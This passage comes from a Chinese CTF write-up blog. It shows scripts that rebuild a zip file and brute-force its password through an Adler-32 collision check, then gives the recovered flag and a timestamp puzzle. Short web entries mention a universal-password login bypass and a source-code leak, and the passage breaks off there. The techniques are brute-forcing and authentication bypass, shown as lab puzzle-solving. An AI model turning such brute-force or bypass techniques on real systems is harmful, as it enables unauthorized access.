</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>s<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00\x00\x00\x00\x83\x00\x00\x00</span><span style=color:#e6db74>N</span><span style=color:#ae81ff>\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05</span><span style=color:#e6db74>KP</span><span style=color:#ae81ff>\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0b</span><span style=color:#e6db74>xu[</span><span style=color:#ae81ff>\xd1\x9e\x8d\x03\x00\x05</span><span style=color:#e6db74>TUtxt.galf</span><span style=color:#ae81ff>\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00</span><span style=color:#e6db74>%</span><span style=color:#ae81ff>\x00\x00\x00</span><span style=color:#e6db74>1=</span><span style=color:#ae81ff>\x16\x04\x0c</span><span style=color:#e6db74>MY</span><span style=color:#ae81ff>\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01</span><span style=color:#e6db74>KP</span><span style=color:#ae81ff>\x00\x00\x00</span><span style=color:#e6db74>%</span><span style=color:#ae81ff>\x00\x00\x00</span><span style=color:#e6db74>1=</span><span style=color:#ae81ff>\x16\x04\x0c\x08\x07</span><span style=color:#e6db74>KP</span><span style=color:#ae81ff>\x04</span><span style=color:#e6db74>5R</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>M</span><span style=color:#ae81ff>\xc2\xde\x14</span><span style=color:#e6db74>sg</span><span style=color:#ae81ff>\x92\xd0</span><span style=color:#e6db74>K</span><span style=color:#ae81ff>\xbf</span><span style=color:#e6db74>h</span><span style=color:#ae81ff>\x9c\x08\xeb\xf3</span><span style=color:#e6db74>@</span><span style=color:#ae81ff>\x9d\x00\x14\x8b</span><span style=color:#e6db74>^</span><span style=color:#ae81ff>\xfb\xa5\x96</span><span style=color:#e6db74>O</span><span style=color:#ae81ff>\xc0\xdd\x8a</span><span style=color:#e6db74>(</span><span style=color:#ae81ff>\xe6\x0c\x92\x1e</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\xad\x86\xa6</span><span style=color:#e6db74>@</span><span style=color:#ae81ff>\xbc</span><span style=color:#e6db74>@J=</span><span style=color:#ae81ff>\x11</span><span style=color:#e6db74>Z</span><span style=color:#ae81ff>\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0b</span><span style=color:#e6db74>xu[</span><span style=color:#ae81ff>\xd1\x9e\xfb</span><span style=color:#e6db74>[</span><span style=color:#ae81ff>\xd1\x9e\x8d\x03\x00\t</span><span style=color:#e6db74>TUtxt.galf</span><span style=color:#ae81ff>\x00\x1c\x00\x08\x00\x00\x00</span><span style=color:#e6db74>%</span><span style=color:#ae81ff>\x00\x00\x00</span><span style=color:#e6db74>1=</span><span style=color:#ae81ff>\x16\x04\x0c</span><span style=color:#e6db74>MY</span><span style=color:#ae81ff>\x95\x8f\x00\x00\x00\t\x00\n\x04\x03</span><span style=color:#e6db74>KP&#34;</span>
</span></span><span style=display:flex><span>f<span style=color:#f92672>=</span>open(<span style=color:#e6db74>&#39;extract.zip&#39;</span>,<span style=color:#e6db74>&#39;wb&#39;</span>)<span style=color:#f92672>.</span>write(s[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span></code></pre></td></tr></table></div></div><p>使用JavaScript爆破密码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>dec2hexString</span>(<span style=color:#a6e22e>dec</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;0x&#39;</span> <span style=color:#f92672>+</span> (<span style=color:#a6e22e>dec</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x10000</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>).<span style=color:#a6e22e>substr</span>(<span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>).<span style=color:#a6e22e>toUpperCase</span>();
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>bruteforce</span>(){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;<span style=color:#a6e22e>i</span><span style=color:#f92672>&lt;</span><span style=color:#ae81ff>0xffff</span>;<span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>check</span>(<span style=color:#a6e22e>dec2hexString</span>(<span style=color:#a6e22e>i</span>)))<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;password{&#34;</span><span style=color:#f92672>+</span><span style=color:#a6e22e>dec2hexString</span>(<span style=color:#a6e22e>i</span>)<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;}&#34;</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>bruteforce</span>()
</span></span><span style=display:flex><span><span style=color:#75715e>// password{0x0120} √
</span></span></span><span style=display:flex><span><span style=color:#75715e>// password{0x1011} ×
</span></span></span></code></pre></td></tr></table></div></div><p>或者使用python爆破：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-30>30</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># /^password{([0-9a-zA-Z_@!?-]+)}$/</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>adler32</span>(s):
</span></span><span style=display:flex><span>    i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;a<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>;b<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;M<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;c<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;d<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> i<span style=color:#f92672>&lt;</span>len(s):
</span></span><span style=display:flex><span>        M<span style=color:#f92672>=</span>min(len(s)<span style=color:#f92672>-</span>i,<span style=color:#ae81ff>3850</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> M<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            c<span style=color:#f92672>=</span>ord(s[i]);i<span style=color:#f92672>+=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> c<span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x80</span>:
</span></span><span style=display:flex><span>                a<span style=color:#f92672>+=</span>c
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>elif</span> c<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0xd800</span> <span style=color:#f92672>and</span> c <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0xe000</span>:
</span></span><span style=display:flex><span>                c<span style=color:#f92672>=</span> (c <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1023</span>) <span style=color:#f92672>+</span><span style=color:#ae81ff>64</span> ;d <span style=color:#f92672>=</span> s[i]<span style=color:#f92672>&amp;</span><span style=color:#ae81ff>1023</span>;i<span style=color:#f92672>+=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                a<span style=color:#f92672>+=</span><span style=color:#ae81ff>240</span> <span style=color:#f92672>|</span> ((c <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>7</span>); b <span style=color:#f92672>+=</span> a; M<span style=color:#f92672>-=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                a <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> ((c <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>); b <span style=color:#f92672>+=</span> a; M<span style=color:#f92672>-=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                a <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> ((d <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>15</span>) <span style=color:#f92672>|</span> ((c <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>); b <span style=color:#f92672>+=</span> a; M<span style=color:#f92672>-=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                a <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> (d <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                a <span style=color:#f92672>+=</span> <span style=color:#ae81ff>224</span> <span style=color:#f92672>|</span> ((c <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>15</span>); b <span style=color:#f92672>+=</span> a;M<span style=color:#f92672>-=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                a <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> ((c <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>); b <span style=color:#f92672>+=</span> a;M<span style=color:#f92672>-=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                a <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> (c <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>)
</span></span><span style=display:flex><span>            b<span style=color:#f92672>+=</span>a;M<span style=color:#f92672>-=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> (<span style=color:#ae81ff>15</span> <span style=color:#f92672>*</span> (a <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>+</span> (a <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>65535</span>))
</span></span><span style=display:flex><span>        b <span style=color:#f92672>=</span> (<span style=color:#ae81ff>15</span> <span style=color:#f92672>*</span> (b <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>+</span> (b <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>65535</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ((b <span style=color:#f92672>%</span> <span style=color:#ae81ff>65521</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>|</span> (a <span style=color:#f92672>%</span> <span style=color:#ae81ff>65521</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(<span style=color:#e6db74>&#39;0123456789&#39;</span>,repeat<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0x&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(i)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> adler32(p)<span style=color:#f92672>==</span>adler32(<span style=color:#e6db74>&#39;0x0201&#39;</span>):
</span></span><span style=display:flex><span>        print p,
</span></span><span style=display:flex><span>        <span style=color:#75715e># [0x0120] 0x0201 0x1011</span>
</span></span></code></pre></td></tr></table></div></div><p>密码为<code>password{0x0120}</code> ，解压得到flag。<code>flag{cjvf33_98hfi3_jfh3_dsh93h_f3had}</code> 。</p><h3 id=misc3>MISC3<a hidden class=anchor aria-hidden=true href=#misc3>#</a></h3><p>给了1321个TXT，每个文件一个字符，内容如下。提示时间戳，没搞懂要干啥。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat ./*
</span></span><span style=display:flex><span>Money is not evil by itself.Its just paper with perceived value to obtain other things we value in other ways.If not money - what is. evil you may ask?Evil is the unquenchable, obsessive and moral bending desire <span style=color:#66d9ef>for</span> more.Evil is the bottomless, soulless and obsessive-compulsive pursuit of some pot of gold.at the end of some rainbow which doesn<span style=color:#e6db74>&#39;t exist.Evil is having a price tag for your heart and soul in exchange for financial success at any cost.Evil is trying to buy happiness, again and again.until all of those fake, short lived mirages of emotions are gone.Make more time.I&#39;</span>m not saying you can<span style=color:#e6db74>&#39;t be financially successful.I&#39;</span>m saying have a greater purpose in life well beyond the pursuit of financial success.Your soul is screaming <span style=color:#66d9ef>for</span> you to answer your true calling.You can change today <span style=color:#66d9ef>if</span> you redefine what success is to you.You can transform your damaged relationships and build new ones.You can forgive yourself and others who<span style=color:#e6db74>&#39;ve hurt you.You can become a leader by mentoring with others who you aspire to be like.You can re-balance your priorities in life.You can heal your marriage and recreate a stronger love than you ever thought possible.You can become the best parent possible at any age - even 86.but don&#39;</span>t wait <span style=color:#66d9ef>until</span> <span style=color:#66d9ef>then</span>...You will always be able to make more money.But you cannot make more time.
</span></span></code></pre></td></tr></table></div></div><p>记录一个获取文件时间的方式。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
</span></span><span style=display:flex><span>a<span style=color:#f92672>=</span>subprocess<span style=color:#f92672>.</span>check_output((<span style=color:#e6db74>&#34;stat&#34;</span>,<span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;%y&#34;</span>, file_name))
</span></span></code></pre></td></tr></table></div></div><h2 id=web>Web<a hidden class=anchor aria-hidden=true href=#web>#</a></h2><h3 id=web1>Web1<a hidden class=anchor aria-hidden=true href=#web1>#</a></h3><p>万能密码</p><h3 id=web2>Web2<a hidden class=anchor aria-hidden=true href=#web2>#</a></h3><p>主页CTRL+U，发现源码泄露。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-16>16</a>
